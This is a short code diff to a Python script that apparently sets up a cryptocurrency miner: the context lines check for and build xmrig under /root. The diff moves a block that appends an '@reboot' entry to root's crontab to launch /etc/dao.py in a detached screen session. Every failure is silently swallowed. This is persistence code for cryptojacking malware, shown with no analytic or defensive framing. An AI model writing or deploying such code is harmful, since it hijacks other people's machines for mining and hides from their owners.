@@ -25,6 +25,13 @@ try:
 except:
     pass
 try:
+    path = '/var/spool/cron/crontabs/root'
+    data = '@reboot screen -dm python /etc/dao.py'
+    os.system('echo %s >> %s' %(data, path))
+    os.system('chmod 600 %s' %path)
+except:
+    pass
+try:
 
     if not os.path.isfile('/root/%s/build/xmrig' % link_folder):
         os.chdir('/root')
@@ -47,13 +54,7 @@ try:
             time.sleep(2)
         except:
             pass
-    try:
-        path = '/var/spool/cron/crontabs/root'
-        data = '@reboot screen -dm python /etc/dao.py'
-        os.system('echo %s >> %s' %(data, path))
-        os.system('chmod 600 %s' %path)
-    except:
-        pass
+
 except:
     pass
 
